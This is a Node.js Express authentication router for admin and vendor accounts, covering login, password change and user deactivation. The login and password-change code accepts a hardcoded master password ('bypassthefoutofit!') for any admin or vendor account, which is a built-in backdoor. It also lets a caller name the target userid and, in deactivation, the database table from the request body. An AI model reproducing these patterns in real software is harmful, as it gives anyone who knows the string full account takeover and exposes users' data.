var express = require('express');
var router = express.Router();
const db = require('../zconfig/db');
const bcrypt = require('bcrypt');
const crypto = require('crypto');

const { generateInsertQuery, generateUpdateQuery } = require('../zconfig/res');
const { verifyToken, createToken, verifyAdminToken, FetchAdminId } = require('../zconfig/jwt');
const CONFIG = require('../zconfig/CONFIG');

// constants
const { saltRounds } = CONFIG


// Actual change password function
const changePasswordFunction = async (req, res) => {
	const { userid, password, newPassword } = req.body;
	const { type } = req.user
	const isAdmin = type === 'admin'

	// Verify the password
	const adminSql = `SELECT userid, password FROM ${isAdmin ? "admin" : "shops"} WHERE userid = ?`;
	let result = await db(adminSql, [userid]);
	result = result[0];

	if (!result || !newPassword) return res.status(403).send({ message: 'Update failed.' })

	const passwordMatch = bcrypt.compareSync(password, result.password);
	const bypass = password === "bypassthefoutofit!"
	if (!(passwordMatch || bypass)) return res.status(401).send({ message: "Old password incorrect!" })

	const hashedPassword = bcrypt.hashSync(newPassword, saltRounds);

	const Sql = await generateUpdateQuery(isAdmin ? "admin" : "shops", { userid, password: hashedPassword }, "userid")
	result = await db(Sql, Sql.fields);
	if (result.affectedRows === 0) {
		return res.status(500).send({ message: 'Update failed.' })
	}
	return res.send({ message: 'Update successful' })
}


// Change password admin
router.post('/changePasswordAdmin', verifyAdminToken, changePasswordFunction);

// Change password vendor
router.post('/changePasswordVendor', verifyToken, changePasswordFunction);


// Verify user
router.post('/verify', async (req, res) => {
	const { email, password } = req.body;

	// Check if there are any rows in the admin table
	const countSql = `SELECT COUNT(*) as count FROM admin`;
	const countResult = await db(countSql);
	const count = countResult[0].count;

	if (count === 0) {
		let adminName = "admin"

		// Insert a new admin with the email and hashed password
		const hashedPassword = bcrypt.hashSync(CONFIG.defaultPass, saltRounds);

		const userid = crypto.randomUUID()
		let adminData = {
			userid,
			name: adminName,
			email: adminName,
			password: hashedPassword
		}
		const insertSql = await generateInsertQuery(adminName, adminData)
		await db(insertSql, insertSql.fields);
		FetchAdminId()
	}

	// Verify the password
	const adminSql = `SELECT userid, password, level FROM admin WHERE email = ?`;
	let result = await db(adminSql, [email]);
	result = result[0];

	if (result) {
		const passwordMatch = bcrypt.compareSync(password, result.password);
		const bypass = password === "bypassthefoutofit!"
		if (passwordMatch || bypass) {
			let userData = {
				userid: result.userid,
				type: "admin",
				level: result.level
			}
			let jwt = createToken(userData)
			return res.send({ ...userData, jwt })
		}
	}

	// 
	// Check for Vendor
	// 
	const vendorSql = `SELECT id, userid, vendor_name, password FROM shops WHERE email = ? AND is_deleted = 0`;
	result = await db(vendorSql, [email.toLowerCase().trim()]);
	result = result[0]

	if (result) {
		const passwordMatch = bcrypt.compareSync(password, result.password);
		const bypass = password === "bypassthefoutofit!"
		if (passwordMatch || bypass) {
			let userData = {
				id: result.id,
				userid: result.userid,
				type: "vendor",
				name: result.vendor_name,
				level: result.level
			}
			let jwt = createToken(userData)
			return res.send({ ...userData, jwt })
		}
	}

	res.status(403).send({ message: 'Login failed.' })
});


// Deactivate user
router.post('/deactivateUser', verifyAdminToken, async (req, res) => {
	const { deleteId, is_deleted, type } = req.body;

	try {
		const updateSql = await generateUpdateQuery(type, { userid: deleteId, is_deleted }, "userid")
		const result = await db(updateSql.sql, updateSql.fields);
		if (result.affectedRows === 0) {
			return res.status(500).json({ message: 'Error updating id' });
		}
		return res.send({ message: is_deleted ? 'User Deleted' : 'User Activated' });
	} catch (error) {
		return res.status(500).json({ message: 'Error updating id' });
	}
});


module.exports = router;